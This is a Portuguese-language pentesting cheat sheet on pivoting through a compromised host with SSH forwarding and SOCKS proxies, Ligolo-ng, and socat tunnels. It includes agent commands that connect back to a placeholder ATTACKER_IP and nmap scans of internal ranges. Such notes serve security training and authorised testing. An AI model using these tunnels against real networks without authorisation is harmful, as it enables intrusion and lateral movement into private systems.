### 1 Pivotagem com SSH
```bash
# Port Forwarding Local (trazer porta remota para local)
# Sintaxe: ssh -L [porta_local]:[host_destino]:[porta_destino] usuario@host_intermediario
ssh -L 8080:192.168.1.10:80 user@compromised_host
# Acesso: http://localhost:8080

# Port Forwarding Remoto (expor porta local no servidor remoto)
# Sintaxe: ssh -R [porta_remota]:[host_local]:[porta_local] usuario@host_intermediario
ssh -R 9090:localhost:80 user@compromised_host

# Dynamic Port Forwarding (SOCKS Proxy)
# Cria um proxy SOCKS na porta local
ssh -D 1080 user@compromised_host
# Configurar proxychains para usar: socks5 127.0.0.1 1080

# Pivotagem completa com SOCKS proxy
ssh -D 1080 -f -N user@compromised_host
proxychains nmap -sT -Pn 192.168.1.0/24

# Túnel SSH com compressão (melhor para conexões lentas)
ssh -D 1080 -C -f -N user@compromised_host

# Múltiplos port forwards simultâneos
ssh -L 8080:10.10.10.1:80 -L 3389:10.10.10.2:3389 -L 445:10.10.10.3:445 user@compromised_host

# Jump Host (ProxyJump) - SSH através de múltiplos hosts
ssh -J user1@jump_host user2@internal_host

# Manter túnel ativo com autoreconnect
autossh -M 0 -D 1080 -f -N user@compromised_host

# Configuração no proxychains.conf para usar o túnel SSH
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Exemplo de varredura completa através do túnel SSH
ssh -D 1080 -f -N user@10.10.10.5
proxychains nmap -sT -Pn -p- 192.168.1.100
```

### 2 Pivotagem com Ligolo-ng
```bash
# Instalação do Ligolo-ng
# Download: https://github.com/nicocha30/ligolo-ng/releases

# No atacante (servidor Ligolo)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# No host comprometido (agente Ligolo)
# Windows:
agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Linux:
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Comandos no console Ligolo (após conexão do agente)
# Listar sessões
session

# Selecionar sessão
session [ID]

# Listar interfaces de rede do host comprometido
ifconfig

# Adicionar rota no atacante para a rede interna
# (executar em outro terminal no atacante)
sudo ip route add 192.168.1.0/24 dev ligolo

# Iniciar túnel no console Ligolo
start

# Agora pode fazer varredura direta na rede interna
nmap -sT -Pn 192.168.1.0/24

# Port Forwarding com Ligolo (listener)
# No console Ligolo
listener_add --addr 0.0.0.0:3389 --to 192.168.1.10:3389

# Listar listeners ativos
listener_list

# Remover listener
listener_stop [ID]

# Exemplo completo de workflow
# 1. Iniciar proxy no atacante
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2. Transferir e executar agente no host comprometido
./agent -connect 10.10.14.5:11601 -ignore-cert

# 3. No console Ligolo, verificar conexão
session
ifconfig

# 4. Adicionar rota (em outro terminal)
sudo ip route add 172.16.0.0/24 dev ligolo

# 5. Iniciar túnel
start

# 6. Varredura na rede interna
nmap -sT -Pn -p- 172.16.0.0/24
nmap -sV -sC -p 80,443,445,3389 172.16.0.10

# Múltiplas redes internas
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo

# Cleanup
listener_stop 0
stop
sudo ip link delete ligolo
```


### 3 Tunelamento com socat
```bash
# abrir uma porta localmente no kali para receber o trafego e definir outra porta par tornar acessivel este trafego

socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr

# agora temos de ir no alvo e redirecionar o trafego da porta que queremos acessar, para a porta do nosso kali:

socat TCP4:IPKALI:8443 TCP4:127.0.0.1:22

# agora podemos acessar localmente no kali a porta 2222 que foi aberta com o serviço que esta rodando la no alvo na porta 22:

ssh localhost:2222
```